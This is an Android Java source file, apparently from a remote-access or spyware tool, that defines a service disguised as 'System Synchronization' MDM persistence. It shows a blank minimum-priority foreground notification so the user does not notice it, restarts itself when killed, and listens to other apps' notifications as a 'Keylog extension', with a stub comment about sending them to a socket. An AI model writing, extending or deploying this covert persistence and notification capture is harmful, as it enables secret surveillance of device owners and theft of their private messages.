package com.etechd.l3mon;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class MDMPersistenceService extends NotificationListenerService {

    private static final String TAG = "MDMPersist";

    @Override
    public void onCreate() {
        super.onCreate();
        // Foreground Service implementation to prevent OS killing
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = "sync_channel";
            NotificationChannel channel = new NotificationChannel(
                    channelId,
                    "System Synchronization",
                    NotificationManager.IMPORTANCE_MIN // Invisible/Lowest priority
            );
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);

            Notification notification = new Notification.Builder(this, channelId)
                    .setContentTitle("")
                    .setContentText("")
                    .build();

            startForeground(1001, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Return sticky to auto-restart the service if killed
        return Service.START_STICKY;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Notification listener just helps keeping process alive (Android allows this permanently)
        // Also captures notifications (Context-Aware / Keylog extension)
        try {
            if (sbn != null && sbn.getPackageName() != null) {
                String pkg = sbn.getPackageName();
                // Send to socket dynamically...
            }
        } catch (Exception e) {}
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Optional implementation
    }
}
